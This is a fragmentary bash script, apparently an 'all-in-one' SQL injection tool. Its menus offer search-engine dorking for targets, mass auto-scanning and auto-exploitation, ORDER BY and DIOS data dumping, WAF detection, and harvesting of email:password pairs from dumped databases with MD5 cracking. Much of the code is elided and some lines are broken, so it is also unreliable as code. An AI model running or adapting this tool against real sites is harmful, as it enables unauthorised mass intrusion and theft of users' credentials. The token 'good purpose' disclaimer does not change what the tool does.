...
#USE THESE TOOLS FOR A GOOD PURPOSE TO HELP PENTESTING
#NOT TO DAMAGE EVERYTHING AT THE USER'S RESPONSIBILITY
#Author: by Kedjaw3n
#made: 8 - 03 - 2021
#release: 
N='\033[0m'
      ...
      -dyo/////.```            ```./////ohh-
        :hMhoosss/`            `/sssoohMh:
          .ohysoos.            .soosyh+`
             `/sdN`            `Nds/`
   ...::::[ Powered by Neuchi ]::::...
            ${N} |==┣▇▇▇▇▇▇═─-SQl-i${G} ${O} Neuchi${G}3${O}n ??${N}
::::::::::::::::::All-in one injector tools:::::::::::::::::::::::
        This tool is made using manual queries
   easy to understand for those who don't understand sql injection
                   - sqli never die -
================================================================="
...
echo -e "[*] Tnx for using this tools :')";rm -rf 1-$list 0-$list
...
if [ $? -eq 0 ];then
  ...
  then
    ...
    echo -e "${R}[!] sqli inject point not found\ntry to check the output/$dir/crawled.txt to find your own inject point${N}"
   fi
else
  echo "[!] failed to fetch url"
       ...
       echo -e "${R}connection error: recheck URL or server down$N" >&2
fi
}
...
dora() {
    for COUNT in $(seq 1 $pa) 
       do
         ...
         for b in $b #if you want the result from google, just change it $b > $g
         do
...
email() {
  echo "$line";curl -s "$line" > tmp;grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' "tmp" | sort | uniq -i > list;echo "";echo "Total Dumped : `wc -l list`";for in gmail yahoo and hotmail;do cat list | grep $i > $i.txt;echo "[+] `wc -l $i.txt`";done;cat list | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail > others.txt;echo "[+] others : `wc -l others.txt`";rm tmp
}
    ...
    if [[ "$based64" = "y" ]]
      ...
      its=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
       ...
       info=$(curl -s -L "$db" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d')
        ...
        echo -e "[INFO] failed to retrieve server info"
    fi
}
...
dios() {
  if cat .angka >/dev/null
   then
    if echo $ngecur | grep -Po "Unknown column 'neuchi[0-9]*'" >/dev/null
       then
        df=$(echo $ngecur | grep -Po "neuchi[0-9]*" | sed 's/neuchi//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -s -L "$ids" | grep -Po 'neuchi[0-9]*' > .number
        cat .number |  sed 's/neuchi//g' > .number
    fi
    if [[ "$based64" = "y" ]]
        then
    ...
    in=$(cat .number | sort | head -1)
    dk=$( echo "$i" | sed "s/${in}/44444444/g") #bug if the lottery numbers are at the end the result will be blank
...
echo -n -e "start counting order by ~"
for i in $(seq 50)
  do
    spin
   ...
   if [ $? -eq 0 ]
    ...
    if echo -e "$ngecur" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null
      then 
       echo -e "\n${R}[INFO] waf blocked try hard waff injection for bypass$N"
       echo -e "$site" >> waf.txt
      break
    fi
    if echo "$ngecur" | grep -Po "Neuchi|Neuchi[0-9]*" > .number
      then
       ...
       mkdir -p output/$dir
       echo -e -n "\order by what you get ${i} colomn"
       ...
       if [[ "$based64" = "y" ]]
         then
          ...
          echo -e "Query: $base64"
          echo -e "${O}the numbers displayed:$G $Neuchi$N\n" | sed 's/Neuchi//g'
       else
       ...
       echo -e "${O}the numbers displayed:$G $number$N\n" | sed 's/Neuchi//g'
       echo -e "$number" |  sed 's/Neuchi//g' | grep -a -o '[0-9]' > .number
     fi
       if echo $mass | grep -Po "y" >/dev/null
       then
        break
      else
       echo -n "continue dios ?? y/n: "
       read ask
       if [[ "$ask" = "y" ]] 
        then
          dios
       ...
       echo -e "\n${R}connection error: recheck URL or server down$N" >&2
       break
  fi
done;endspin
}
...
echo -e "[1]. single site injection"
...
case $d in
 ...
 2) mass="y"
  ...
  3) mass="y"
     ...
     echo -e "[1]. normal dorkiny"
      echo -e "[2]. mass dorking"
      ...
      case $d in
       1) mass="y"
          clear
          banner
          echo -e "${G}[+] Auto dorking + auto scan + auto xploit\n${O}Nb: MAYBE THERE STILL HAVE A LITTLE BUGS WHICH IS NOT COMPATIBLE WITH REAL VULN${N} "
        ...
        2) mass="y"
          clear
          banner
          echo -e "${G}[+] Auto dorking mass + auto scan + auto xploit\n${O}Nb: MAYBE THERE STILL HAVE A LITTLE BUGS WHICH IS NOT COMPATIBLE WITH REAL VULN${N} "
          echo -n "[+] dorking bing/google: b/g ?? "
          read page
          ...
          for site in $(cat Result_dorking.txt 2>/dev/null | sort | uniq -i)
            ...
            menu
       ;;
         *) echo -e "[+] Tnx for using this tools";;
         esac
  ;; 
  4) based64="y"
     mass="n"
     clear
     banner
     echo -e "$G[!] base64 injection\n${O}ESPECIALLY FOR INJECT POINT BASE64$N"
     read -p "site: " site
     sqli
     menu
  ;;      
  ...
  menu
   ...
   6) clear
     ...
     case $d in
      ...
      2) clear
        banner
        echo -e "$G[!] scan site + auto inject mass$N"
   ...
   8) clear
      ...
      case $p in
        1) clear
           banner
           echo -e "$G[!] Query Email Pass dumper + auto filter mail ${N}"
           read -p "Enter the sqli query that has been dumped by the email pass: " line
           email
           menu
           ;;
        2) clear
           banner
           echo -e "$G[!] Query Email Pass dumper + auto filter mail ${N}"
           read -p "Enter the sqli query that has been dumped by the email pass: " file
   ...
   9) clear
      ...
      echo -e "[2]. md5 decryptor"
      echo -e "[3]. md5 email pass decryptor"
      echo -n "[?] According to which ?? "
      read p
      case $p in
        1) clear
        ...
        3) clear
           banner
           echo -e "$G[!] md5 email pass decrytor ${N}"
           hashmail
           menu
          ;;
        *) clear;menu;;
